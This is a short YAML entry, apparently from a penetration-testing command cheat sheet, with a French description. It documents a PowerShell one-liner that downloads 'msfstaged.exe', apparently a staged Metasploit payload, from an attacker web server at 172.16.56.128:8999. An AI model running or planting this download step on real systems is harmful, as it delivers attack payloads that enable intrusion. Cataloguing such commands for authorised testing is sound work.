---
description: |
  (New-Object Net.WebClient).DownloadFile est une commande PowerShell qui utilise la classe .NET WebClient pour télécharger un fichier depuis le serveur et l'enregistrer dans un répertoire local.

  Command Reference:

  	Webserver: http://172.16.56.128:8999/msfstaged.exe

  	File name: msfstaged.exe

command: |
  (New-Object Net.WebClient).DownloadFile('http://172.16.56.128:8999/msfstaged.exe', 'msfstaged.exe')
items:
  - Shell
OS:
  - Windows
  - Approved-tool
attack_types:
  - General
references:
  - https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-7.0
  - https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
---
